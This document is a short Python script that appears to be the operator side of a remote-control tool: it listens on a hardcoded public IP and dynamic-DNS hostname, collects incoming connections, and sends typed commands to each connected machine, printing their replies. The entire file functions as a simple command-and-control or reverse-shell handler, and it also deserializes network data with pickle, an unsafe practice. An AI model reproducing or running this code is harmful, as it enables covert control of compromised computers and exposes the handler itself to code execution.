import socket
import pickle
import threading
import sys
import pdb

#TODO
#   1. fix synchronization between recv & send state || Done!


#Server properties
IP = '212.238.239.196' #    --> thanathos.hopto.org
PORT = 9999
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket
socket.bind((IP, PORT))
socket.listen()


#Socket list
socketList = []


def recv(c):
    global socketList
    try:
        data = pickle.loads(c.recv(4096))
        print(data)
    except:
        c.close()
        print("Didn't get anything")
        sys.exit()

def send():
    
    while True:
        for socket in socketList:
            try:
                command = input(">> ")
                command = str(command)
                socket.send(pickle.dumps(command))

            except Exception as e:
                socket.close()
                print(e)

            recv(socket)


#Accept incomming socket connections on a thread
def connect():
    global socket
    global socketList
    print("thread started")
    while True:
        try:
            c, a = socket.accept()
            socketList.append(c)

        except Exception as e:
            print(e)



        if len(socketList) > 0:
            print(socketList[-1])

def main():

    threadSocket = threading.Thread(target=connect, args=(), daemon=True)
    threadSocket.start()


    while True:
        send()

main()
